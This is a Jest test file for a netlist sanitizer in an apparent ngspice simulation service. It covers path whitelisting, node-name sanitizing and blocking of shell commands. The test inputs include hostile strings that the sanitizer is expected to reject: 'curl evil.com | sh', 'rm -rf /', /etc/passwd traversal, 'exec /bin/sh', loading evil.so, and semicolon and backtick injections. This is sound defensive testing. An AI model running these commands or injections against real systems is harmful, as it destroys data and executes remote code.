/**
 * Netlist Sanitizer Tests
 * Tests for include path whitelisting and security features
 */
import {
    validateIncludePath,
    sanitizeNodeName,
    sanitizeNetlist,
    sanitizeValue,
    validateDesignator,
    hasShellMetacharacters,
    SecurityError,
} from '../src/netlist/sanitizer';

describe('NetlistSanitizer', () => {
    describe('validateIncludePath', () => {
        const jobDir = '/tmp/sim/job123';

        it('should allow files within job directory', () => {
            expect(() => validateIncludePath('model.lib', jobDir)).not.toThrow();
            expect(() => validateIncludePath('models/diode.lib', jobDir)).not.toThrow();
        });

        it('should reject absolute paths', () => {
            expect(() => validateIncludePath('/etc/passwd', jobDir)).toThrow(SecurityError);
            expect(() => validateIncludePath('C:\\Windows\\system32\\config', jobDir)).toThrow(SecurityError);
        });

        it('should reject parent directory traversal', () => {
            expect(() => validateIncludePath('../outside.lib', jobDir)).toThrow(SecurityError);
            expect(() => validateIncludePath('models/../../../etc/passwd', jobDir)).toThrow(SecurityError);
        });

        it('should reject special prefixes', () => {
            expect(() => validateIncludePath('~/.bashrc', jobDir)).toThrow(SecurityError);
            expect(() => validateIncludePath('$HOME/file', jobDir)).toThrow(SecurityError);
        });

        it('should allow common model file extensions', () => {
            expect(() => validateIncludePath('model.lib', jobDir)).not.toThrow();
            expect(() => validateIncludePath('model.mod', jobDir)).not.toThrow();
            expect(() => validateIncludePath('model.subckt', jobDir)).not.toThrow();
            expect(() => validateIncludePath('model.inc', jobDir)).not.toThrow();
        });
    });

    describe('sanitizeNodeName', () => {
        it('should prefix alphanumeric names with n', () => {
            const result = sanitizeNodeName('out123');
            expect(result).toMatch(/^n/);
        });

        it('should replace special characters with underscores', () => {
            expect(sanitizeNodeName('node-1')).toContain('_');
            expect(sanitizeNodeName('node.1')).toContain('_');
        });

        it('should handle mixed special characters', () => {
            const result = sanitizeNodeName('node-1.out');
            expect(result).toContain('_');
            expect(result).not.toContain('-');
            expect(result).not.toContain('.');
        });

        it('should prefix reserved words', () => {
            const result = sanitizeNodeName('gnd');
            expect(result).toMatch(/^x_/);
        });

        it('should handle empty string', () => {
            expect(sanitizeNodeName('')).toBe('node');
        });

        it('should prefix numeric-only names', () => {
            expect(sanitizeNodeName('123')).toBe('n123');
        });

        it('must not emit a node that IS an ngspice operator token (net "e" -> "ne" == not-equal)', () => {
            // net 'e' (emitter!) prefixes to 'ne', which ngspice parses as != -> v(ne) silently kills wrdata.
            expect(sanitizeNodeName('e')).not.toBe('ne');
            expect(sanitizeNodeName('e')).toBe('x_ne');
            expect(sanitizeNodeName('ot')).toBe('x_not'); // 'ot' -> 'not'
            // a net literally named like an operator
            expect(sanitizeNodeName('ne')).toBe('x_ne');
            expect(sanitizeNodeName('not')).toBe('x_not');
            // benign names that merely CONTAIN an operator substring are untouched
            expect(sanitizeNodeName('node')).toBe('node');
            expect(sanitizeNodeName('and')).toBe('nand'); // prefixed 'n' -> not an operator token, fine
        });
    });

    describe('sanitizeNetlist', () => {
        const jobDir = '/tmp/sim/job123';

        it('should pass through valid netlist', () => {
            const netlist = `* Test circuit
V1 in 0 DC 5
R1 in out 1k
.end`;
            const result = sanitizeNetlist(netlist, jobDir);
            expect(result).toBe(netlist);
        });

        it('should reject shell commands', () => {
            const netlist = `.shell echo "hacked"`;
            expect(() => sanitizeNetlist(netlist, jobDir)).toThrow(SecurityError);
        });

        it('should reject system commands', () => {
            const netlist = `.system rm -rf /`;
            expect(() => sanitizeNetlist(netlist, jobDir)).toThrow(SecurityError);
        });

        it('should validate include paths', () => {
            const netlist = `.include ../../../etc/passwd`;
            expect(() => sanitizeNetlist(netlist, jobDir)).toThrow(SecurityError);
        });

        it('should allow valid include paths', () => {
            const netlist = `.include model.lib`;
            expect(() => sanitizeNetlist(netlist, jobDir)).not.toThrow();
        });

        // SECURITY: ngspice runs .control blocks in -b batch mode, and our own generated decks use them
        // (set/run/wrdata/quit). The dangerous commands there have NO leading dot, so blocking only
        // `.shell`/`.system` at the top level missed the real RCE surface. These lock the closed hole.
        it('passes a real generated deck that uses a .control block (set/run/wrdata/quit)', () => {
            const netlist = `* c\nV1 in 0 DC 5\nR1 in 0 1k\n.control\n  set filetype=ascii\n  run\n  wrdata output.csv v(in)\n  quit\n.endc\n.end`;
            expect(() => sanitizeNetlist(netlist, jobDir)).not.toThrow();
        });

        it.each([
            'shell rm -rf /',
            'system curl evil.com | sh',
            'source /etc/passwd',
            'exec /bin/sh',
            'cd /',
            'osdi /tmp/evil.so',
            'codemodel /tmp/evil.cm',
            'load /tmp/x.raw',
        ])('rejects a code-execution/escape command INSIDE a .control block: "%s"', (badCmd) => {
            const netlist = `.control\n  ${badCmd}\n.endc`;
            expect(() => sanitizeNetlist(netlist, jobDir)).toThrow(SecurityError);
        });

        it('rejects wrdata writing OUTSIDE the job dir (absolute path)', () => {
            expect(() => sanitizeNetlist(`.control\n  wrdata /etc/cron.d/x v(in)\n.endc`, jobDir)).toThrow(
                SecurityError,
            );
            expect(() => sanitizeNetlist(`.control\n  wrdata ../../escape.csv v(in)\n.endc`, jobDir)).toThrow(
                SecurityError,
            );
        });

        it('does NOT false-positive on a device whose designator starts with a blocked word (Cd1, Lload2)', () => {
            const netlist = `V1 a 0 DC 5\nCd1 a b 1u\nLload2 b 0 1m`;
            expect(() => sanitizeNetlist(netlist, jobDir)).not.toThrow();
        });
    });

    describe('sanitizeValue', () => {
        it('should preserve valid values', () => {
            expect(sanitizeValue('1k')).toBe('1k');
            expect(sanitizeValue('100n')).toBe('100n');
            expect(sanitizeValue('5V')).toBe('5V');
        });

        it('should preserve source expressions', () => {
            expect(sanitizeValue('SIN(0 1 1k)')).toBe('SIN(0 1 1k)');
            expect(sanitizeValue('DC 5')).toBe('DC 5');
        });

        it('should remove dangerous characters', () => {
            expect(sanitizeValue('1k;rm -rf /')).not.toContain(';');
            expect(sanitizeValue('1k`whoami`')).not.toContain('`');
        });
    });

    describe('validateDesignator', () => {
        it('should accept valid designators', () => {
            expect(validateDesignator('R1')).toBe(true);
            expect(validateDesignator('C10')).toBe(true);
            expect(validateDesignator('V1')).toBe(true);
            expect(validateDesignator('D1')).toBe(true);
        });

        it('should reject invalid designators', () => {
            expect(validateDesignator('1R')).toBe(false);
            expect(validateDesignator('R')).toBe(false);
            expect(validateDesignator('')).toBe(false);
        });
    });

    describe('hasShellMetacharacters', () => {
        it('should detect shell metacharacters', () => {
            expect(hasShellMetacharacters('test;rm')).toBe(true);
            expect(hasShellMetacharacters('test|cat')).toBe(true);
            expect(hasShellMetacharacters('test`whoami`')).toBe(true);
            expect(hasShellMetacharacters('test$HOME')).toBe(true);
        });

        it('should pass clean strings', () => {
            expect(hasShellMetacharacters('test123')).toBe(false);
            expect(hasShellMetacharacters('model.lib')).toBe(false);
        });
    });

    describe('SecurityError', () => {
        it('should be instanceof Error', () => {
            const error = new SecurityError('test', 'TEST_CODE');
            expect(error).toBeInstanceOf(Error);
            expect(error).toBeInstanceOf(SecurityError);
        });

        it('should have correct name', () => {
            const error = new SecurityError('test', 'TEST_CODE');
            expect(error.name).toBe('SecurityError');
        });

        it('should preserve message and code', () => {
            const error = new SecurityError('test message', 'TEST_CODE');
            expect(error.message).toBe('test message');
            expect(error.code).toBe('TEST_CODE');
        });
    });
});
